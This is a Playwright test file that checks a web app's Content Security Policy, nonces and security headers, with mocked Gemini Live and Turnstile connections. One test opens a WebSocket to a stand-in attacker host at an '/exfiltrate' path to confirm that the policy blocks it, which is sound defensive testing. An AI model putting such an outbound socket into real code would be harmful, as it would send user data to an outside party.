import { expect, test } from "./fixtures";

// The CSP is enforced, so anything it blocks is broken for real users. These
// check it allows what the app needs (Next's scripts, the mic AudioWorklet,
// the Gemini Live socket, Turnstile) and still blocks what it should — all
// without reaching Google: the Live socket is intercepted, never connected.

declare global {
  interface Window {
    __cspViolations: string[];
  }
}

test.beforeEach(async ({ page }) => {
  await page.addInitScript(() => {
    window.__cspViolations = [];
    document.addEventListener("securitypolicyviolation", (event) => {
      window.__cspViolations.push(`${event.violatedDirective} ${event.blockedURI}`);
    });
  });
});

test("every page sends the security headers, with a fresh script nonce", async ({ page }) => {
  const first = await page.goto("/");
  const second = await page.request.get("/");
  const headers = first!.headers();

  const csp = headers["content-security-policy"];
  expect(csp).toMatch(/script-src [^;]*'nonce-[A-Za-z0-9+/=]+'[^;]*'strict-dynamic'/);
  expect(csp).toContain("frame-ancestors 'none'");
  expect(csp).toContain("object-src 'none'");
  expect(csp).not.toMatch(/script-src[^;]*'unsafe-inline'/);
  expect(csp).not.toMatch(/script-src[^;]*'unsafe-eval'/);
  expect(second.headers()["content-security-policy"]).not.toBe(csp);

  expect(headers["x-content-type-options"]).toBe("nosniff");
  expect(headers["x-frame-options"]).toBe("DENY");
  expect(headers["referrer-policy"]).toBe("strict-origin-when-cross-origin");
  expect(headers["permissions-policy"]).toContain("microphone=(self)");
  expect(headers["strict-transport-security"]).toBe("max-age=31536000");
  expect(headers["x-powered-by"]).toBeUndefined();
});

// Every <script> in the server's HTML must carry this response's nonce or it
// won't run. (Chunks the bundle adds later carry none — 'strict-dynamic'
// trusts them through the script that loaded them.)
test("server-rendered scripts carry the response's nonce, and pages load with no violations", async ({ page }) => {
  for (const path of ["/", "/sign-in", "/sample-scorecard", "/demo"]) {
    const response = await page.request.get(path);
    const nonce = /'nonce-([^']+)'/.exec(response.headers()["content-security-policy"])![1];
    const scriptTags = (await response.text()).match(/<script(?:\s[^>]*)?>/g) ?? [];
    expect(scriptTags.length).toBeGreaterThan(0);
    expect(scriptTags.filter((tag) => !tag.includes(`nonce="${nonce}"`))).toEqual([]);

    await page.goto(path);
    await page.waitForLoadState("networkidle");
    expect(await page.evaluate(() => window.__cspViolations)).toEqual([]);
  }
});

test("the microphone's AudioWorklet module is allowed", async ({ page }) => {
  await page.goto("/");
  const result = await page.evaluate(async () => {
    const context = new AudioContext();
    try {
      await context.audioWorklet.addModule("/worklets/capture-processor.js");
      return "loaded";
    } catch (error) {
      return String(error);
    } finally {
      await context.close();
    }
  });
  expect(result).toBe("loaded");
  expect(await page.evaluate(() => window.__cspViolations)).toEqual([]);
});

test("the Gemini Live socket is allowed; other origins are blocked", async ({ page }) => {
  let liveSocketOpened = false;
  // Mocked end to end: nothing is ever sent to Google.
  await page.routeWebSocket(/generativelanguage\.googleapis\.com/, (ws) => {
    liveSocketOpened = true;
    ws.close();
  });
  await page.goto("/");

  await page.evaluate(() => {
    new WebSocket("wss://generativelanguage.googleapis.com/ws/e2e");
    try {
      new WebSocket("wss://attacker.example/exfiltrate");
    } catch {
      // Chrome reports the block as a violation event either way.
    }
  });

  await expect.poll(() => liveSocketOpened).toBe(true);
  await expect
    .poll(() => page.evaluate(() => window.__cspViolations))
    .toEqual([expect.stringMatching(/^connect-src wss:\/\/attacker\.example/)]);
});

test("Turnstile's script is allowed to load on the demo", async ({ page }) => {
  const turnstileRequest = page.waitForRequest((request) => request.url().startsWith("https://challenges.cloudflare.com/"));
  await page.goto("/demo");
  await turnstileRequest;
  await page.waitForLoadState("networkidle");
  expect(await page.evaluate(() => window.__cspViolations)).toEqual([]);
});
